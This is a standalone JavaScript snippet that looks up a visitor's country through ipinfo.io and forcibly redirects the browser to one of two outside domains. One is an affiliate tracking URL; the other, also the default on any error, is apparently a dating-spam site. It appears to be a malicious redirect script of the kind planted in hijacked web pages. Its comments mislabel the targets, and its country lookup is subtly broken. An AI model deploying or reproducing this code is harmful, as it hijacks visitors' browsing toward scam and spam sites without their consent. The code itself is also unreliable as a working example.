(function() {
    // Extract the domain part of the URL (before ".")
    var source = document.URL.split("//")[1].split(".")[0];

    // List of countries for redirecting to site1.ru
    var countriesForSite1 = ["FR", "US", "DE", "AU", "CA", "IT", "JP", "NL", "NZ", "SE", "UK"];

    // Function to redirect the user to site1.ru
    function checkCountry1() {
        window.location.href = "https://pwkax.imitrkn.net/?utm_source=2f478e051ad5d971&s1=4375&s2=218263&s3=" + source;
    }

    // Function to redirect the user to site2.ru
    function checkCountry2() {
        window.location.href = "https://dbrpmrq.wonderful-memberflirts.com/uwm2cmy?s1=" + source;
    }

    // Function to handle errors when fetching the country data
    function handleError() {
        // In case of an error, redirect to the default site (site2.ru)
        console.error("Error fetching country data.");
        checkCountry2(); // Default redirect
    }

    // Make an API request to get the user's country data
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://ipinfo.io/json", true); // Make the GET request to the API
    xhr.send(); // Send the request
    xhr.responseType = "json"; // Expect a JSON response
    
    xhr.onload = function() {
        try {
            if (xhr.status === 200) { // Check if the request was successful
                // Get the country code from the API response
                var countryCode = xhr.response.countryCode;

                // If the country is in the list for site1.ru, redirect there
                // Otherwise, redirect to site2.ru
                if (countriesForSite1.indexOf(countryCode) > -1) {
                    checkCountry1();
                } else {
                    checkCountry2();
                }
            } else {
                handleError(); // Handle non-200 responses
            }
        } catch (e) {
            // Catch any errors that occur while processing the API response
            console.error("Error processing API data: ", e);
            handleError(); // Handle the error and redirect to site2.ru
        }
    };

    // Handle errors during the request (e.g., network issues)
    xhr.onerror = handleError;
})();
